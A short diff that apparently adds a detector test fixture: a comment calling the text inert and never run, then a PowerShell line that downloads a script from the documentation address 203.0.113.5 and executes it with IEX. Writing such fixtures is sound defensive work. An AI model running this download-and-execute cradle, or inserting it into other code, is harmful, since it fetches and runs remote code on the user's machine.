@@ -1,0 +1,2 @@
+# Inert test text for the detector (never run). 203.0.113.5 is a documentation-only address.
+IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.5/a')
